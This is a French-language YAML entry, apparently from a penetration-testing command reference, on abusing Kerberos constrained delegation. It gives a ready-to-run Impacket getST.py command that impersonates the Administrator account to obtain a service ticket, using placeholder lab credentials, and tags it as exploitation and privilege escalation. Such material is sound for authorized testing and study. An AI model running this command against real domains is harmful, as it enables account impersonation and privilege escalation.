---
description: |
  Le fichier getST.py d'Impacket demandera un ticket de service et le sauvegardera dans ccache. Si le compte a des privilèges de délégation restreints, vous pouvez utiliser le drapeau `-impersonate` pour demander un ticket au nom d'un autre utilisateur. La commande suivante usurpe l'identité du compte Administrateur et demande un ticket de service en son nom pour le service `www` sur l'hôte `server01.test.local`.

  Command Reference:

  	Target IP: 10.10.10.1

  	Domain: test.local

  	Service: www

  	Host Name: server01.test.local

  	Username: john

  	Password: password123

  	Impersonated User: Administrator

command: |
  python3 getST.py -spn www/server01.test.local -dc-ip 10.10.10.1 -impersonate Administrator test.local/john:password123
items:
  - Username
  - Password
services:
  - Kerberos
OS:
  - Linux
  - Windows
  - Approved-tool
attack_types:
  - Exploitation
  - PrivEsc
  - Persistence
references:
  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py
  - http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html
---
